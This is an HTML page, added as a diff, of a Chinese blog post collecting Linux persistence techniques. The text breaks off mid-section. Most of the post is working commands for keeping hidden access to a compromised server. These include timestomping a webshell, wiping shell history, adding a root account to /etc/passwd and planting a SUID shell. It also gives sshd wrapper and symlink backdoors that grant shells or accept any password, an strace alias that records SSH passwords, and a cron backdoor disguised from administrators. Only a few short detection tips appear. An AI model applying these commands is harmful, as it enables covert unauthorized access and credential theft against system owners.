@@ -1,0 +1,1574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.2.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>Linux 权限维持整理 - cances</title>
+  
+    <meta name="keywords" content="权限维持,linux">
+  
+
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="cances" type="application/atom+xml">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+</head>
+
+<body>
+  
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/categories/
+                  
+                  
+                  
+                    id="blogcategories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tags/
+                  
+                  
+                  
+                    id="blogtags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/friends/
+                  
+                  
+                  
+                    id="blogfriends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" 
+                  
+                  
+                  >
+                  <i class='fas fa-tools fa-fw'></i>工具
+                </a>
+                
+                  <ul class="list-v">
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/exec
+                  
+                  
+                  
+                    id="blogtoolexec"
+                  >
+                  Runtime.exec()
+                </a>
+                
+              </li>
+            
+          
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/getav
+                  
+                  
+                  
+                    id="blogtoolgetav"
+                  >
+                  杀软对比
+                </a>
+                
+              </li>
+            
+          
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/getmskb
+                  
+                  
+                  
+                    id="blogtoolgetmskb"
+                  >
+                  win提权辅助
+                </a>
+                
+              </li>
+            
+          
+                    
+                  </ul>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+      <div id="weather"></div>
+      <script src="https://cdn.jsdelivr.net/gh/w4j1e/blog@master/js/tqa.js"></script>
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/categories/
+                  
+                  
+                  
+                    id="blogcategories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tags/
+                  
+                  
+                  
+                    id="blogtags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/friends/
+                  
+                  
+                  
+                    id="blogfriends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" 
+                  
+                  
+                  >
+                  <i class='fas fa-tools fa-fw'></i>工具
+                </a>
+                
+                  <ul class="list-v">
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/exec
+                  
+                  
+                  
+                    id="blogtoolexec"
+                  >
+                  Runtime.exec()
+                </a>
+                
+              </li>
+            
+          
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/getav
+                  
+                  
+                  
+                    id="blogtoolgetav"
+                  >
+                  杀软对比
+                </a>
+                
+              </li>
+            
+          
+                    
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/blog/tool/getmskb
+                  
+                  
+                  
+                    id="blogtoolgetmskb"
+                  >
+                  win提权辅助
+                </a>
+                
+              </li>
+            
+          
+                    
+                  </ul>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  <div id="l_body">
+    <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post search' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+    
+  </div>
+  <div class='bottom'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="大佬们学慢点。。。" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/archives/"
+              
+              
+              id="archives">
+              <i class='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f4f0.svg fa-fw'></i><p>博文</p>
+            </a>
+          
+            <a href="/contributors/"
+              
+              
+              id="contributors">
+              <p>社区</p>
+            </a>
+          
+            <a href="/blog/tool/"
+              
+              
+              id="blogtool">
+              <p>工具</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+    <div id='safearea'>
+      <div class='body-wrapper' id="pjax-container">
+        
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        Linux 权限维持整理
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年7月20日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="Linux 权限维持整理" data-path="/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  <blockquote>
+<p>大部分来自网上，整理的笔记</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c71bea1a3cacfb608ed0c11558f2644e919.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c71bea1a3cacfb608ed0c11558f2644e919.png" srcset="data:image/png;base64,666" alt="img"></p>
+<h3 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h3><h4 id="1-文件创建时间"><a href="#1-文件创建时间" class="headerlink" title="1. 文件创建时间"></a>1. 文件创建时间</h4><p>如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。</p>
+<p>解决方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r index.php shell.php</span><br></pre></td></tr></table></figure>
+<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p>
+<h4 id="2-文件锁定"><a href="#2-文件锁定" class="headerlink" title="2. 文件锁定"></a>2. 文件锁定</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php  <span class="comment">#锁定文件</span></span><br><span class="line">rm -rf evil.php     <span class="comment">#提示禁止删除</span></span><br><span class="line"></span><br><span class="line">lsattr  evil.php    <span class="comment">#属性查看</span></span><br><span class="line">chattr -i evil.php  <span class="comment">#解除锁定</span></span><br><span class="line">rm -rf evil.php     <span class="comment">#彻底删除文件</span></span><br></pre></td></tr></table></figure>
+<h4 id="3-历史操作命令"><a href="#3-历史操作命令" class="headerlink" title="3. 历史操作命令"></a>3. 历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
+<p>技巧一：只针对你的工作关闭历史记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]<span class="built_in">set</span> +o <span class="built_in">history</span>  <span class="comment">#备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录</span></span><br></pre></td></tr></table></figure>
+<p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
+<p>要重新开启历史功能，执行下面的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span>  <span class="comment">#将环境恢复原状</span></span><br></pre></td></tr></table></figure>
+<p>技巧二：从历史记录中删除指定的命令</p>
+<p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> | grep <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure>
+<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -d [num]</span><br></pre></td></tr></table></figure>
+<p>删除大规模历史操作记录，这里，我们只保留前150行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;150,$d&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure>
+<h4 id="4-passwd写入"><a href="#4-passwd写入" class="headerlink" title="4. passwd写入"></a>4. passwd写入</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd 各部分含义：</span><br><span class="line">用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 各部分含义：</span><br><span class="line">用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 </span><br></pre></td></tr></table></figure>
+<p>写入举例：</p>
+<p>1.增加超级用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$perl</span> -le <span class="string">&#x27;print crypt(&quot;momaek&quot;,&quot;salt&quot;)&#x27;</span></span><br><span class="line">savbSWc4rx8NY</span><br><span class="line"></span><br><span class="line"><span class="variable">$echo</span> <span class="string">&quot;root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>2.如果系统不允许uid=0的用户远程登录，可以增加一个普通用户账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot;</span> &gt;&gt; /etc/shadow</span><br></pre></td></tr></table></figure>
+<h3 id="SUID后门"><a href="#SUID后门" class="headerlink" title="SUID后门"></a>SUID后门</h3><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、SUID权限仅对二进制程序有效。 </span><br><span class="line">2、执行者对于该程序需要具有x的可执行权限</span><br><span class="line">3、本权限仅在执行该程序的过程中有效  </span><br><span class="line">4、在执行过程中执行者将具有该程序拥有者的权限</span><br></pre></td></tr></table></figure>
+<p>创建suid权限的文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cp</span> /bin/bash /tmp/.woot</span><br><span class="line"><span class="variable">$chmod</span> 4755 /tmp/.woot</span><br><span class="line"><span class="variable">$ls</span> -al /.woot</span><br><span class="line">-rwsr-xr-x 1 root root 690668 Jul 24 17:14 .woot</span><br></pre></td></tr></table></figure>
+<p>使用一般用户运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$/tmp/.woot </span><br><span class="line">$/tmp/.woot -p    //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure>
+<p>检测：查找具有suid权限的文件即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +4000 -ls</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h3 id="LKM-Linux-rootkit后门"><a href="#LKM-Linux-rootkit后门" class="headerlink" title="LKM Linux rootkit后门"></a>LKM Linux rootkit后门</h3><p>项目地址:<a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a></p>
+<p>适用的系统:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Debian 9：4.9.0-8-amd64 </span><br><span class="line">Debian 10：4.19.0-8-amd64 </span><br><span class="line">Ubuntu 18.04.1 LTS：4.15.0-38-generic </span><br><span class="line">Kali Linux：4.18.0-kali2-amd64 </span><br><span class="line">Centos 6.10：2.6.32- 754.6.3.el6.x86_64 </span><br><span class="line">Centos 7：3.10.0-862.3.2.el7.x86_64 </span><br><span class="line">Centos 8：4.18.0-147.5.1.el8_1.x86_64</span><br></pre></td></tr></table></figure>
+<h3 id="SSH-后门"><a href="#SSH-后门" class="headerlink" title="SSH 后门"></a>SSH 后门</h3><h4 id="1-SSH-wrapper"><a href="#1-SSH-wrapper" class="headerlink" title="1. SSH wrapper"></a>1. SSH wrapper</h4><p>判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd   //4A是13377的小端模式</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
+<p>在本机执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br></pre></td></tr></table></figure>
+<p>实现原理：init 首先启动的是 /usr/sbin/sshd ,脚本执行到 getpeername  这里的时候，正则匹配会失败，于是执行下一句，启动 /usr/bin/sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp  连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 /usr/sbin/sshd  ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是  13377 就执行sh给个shell。</p>
+<p>想要修改连接端口的话可以利用py修改：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,19526)</span><br><span class="line"><span class="built_in">print</span> repr(buffer)</span><br></pre></td></tr></table></figure>
+<p>优点：<br> 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。<br> 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p>
+<h4 id="2-SSH-软连接后门"><a href="#2-SSH-软连接后门" class="headerlink" title="2. SSH 软连接后门"></a>2. SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su</span><br><span class="line">/tmp/su -oPort=888</span><br><span class="line"></span><br><span class="line">ssh root@127.0.0.1 -p 888</span><br></pre></td></tr></table></figure>
+<p>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p>
+<h4 id="3-SSH-公钥免密登陆"><a href="#3-SSH-公钥免密登陆" class="headerlink" title="3. SSH 公钥免密登陆"></a>3. SSH 公钥免密登陆</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line"><span class="built_in">echo</span> id_rsa.pub &gt;&gt; .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br></pre></td></tr></table></figure>
+<p>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p>
+<h4 id="4-SSH-Keylogger记录密码"><a href="#4-SSH-Keylogger记录密码" class="headerlink" title="4. SSH Keylogger记录密码"></a>4. SSH Keylogger记录密码</h4><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
+<p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/.sshpwd-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;read(5&quot;</span> /tmp/.sshpwd-09May32324242.log | tail -n 11    //根据不同环境自行调试响应行数</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/835775c8fa153d2af1fc59ec13601651530.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/835775c8fa153d2af1fc59ec13601651530.png" srcset="data:image/png;base64,666" alt="img"></p>
+<h4 id="5-strace监听ssh来源流量"><a href="#5-strace监听ssh来源流量" class="headerlink" title="5. strace监听ssh来源流量"></a>5. strace监听ssh来源流量</h4><p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
+<p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sshd    //父进程PID</span><br><span class="line">strace -f -p 6419 -o /tmp/.ssh.log -e trace=<span class="built_in">read</span>,write,connect -s 2048</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/024d9e5006fd696bbe913b8c594961a8350.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/024d9e5006fd696bbe913b8c594961a8350.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1775dd830da62bf35fe5165d66087909742.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1775dd830da62bf35fe5165d66087909742.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p>检测：查看shell的配置文件或者 alias 命令即可发现，例如 ~/.bashrc 或 ~/.zshrc 文件查看是否有恶意的 alias</p>
+<h3 id="Cron后门"><a href="#Cron后门" class="headerlink" title="Cron后门"></a>Cron后门</h3><p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p>
+<p>cron表达式在线生成：<a target="_blank" rel="noopener" href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;echo &#39;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i&#39;)|crontab -</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3150ad3f4881d2e188af61220d7ca9f3113.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3150ad3f4881d2e188af61220d7ca9f3113.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p>这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。</p>
+<p>那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示”no crontab for root”:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bf69160c7ad8187a1b7ab690b89cea58459.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bf69160c7ad8187a1b7ab690b89cea58459.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p>实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
+<p>通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，在下一节会主要讲这个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这几个路径都可以存放cron执行脚本,对应的时间不同</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F; &#x2F;etc&#x2F;cron.daily&#x2F; &#x2F;etc&#x2F;cron.weekly&#x2F; &#x2F;etc&#x2F;cron.hourly&#x2F; &#x2F;etc&#x2F;cron.monthly&#x2F; </span><br></pre></td></tr></table></figure>
+<h3 id="Cat隐藏"><a href="#Cat隐藏" class="headerlink" title="Cat隐藏"></a>Cat隐藏</h3><p>刚刚在cron里面提到了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中：这里的示例我就用 hiding-from-cats  里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。</p>
+<p>cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令。</p>
+<p>使用python生成带有换行符的内容sh：</p>
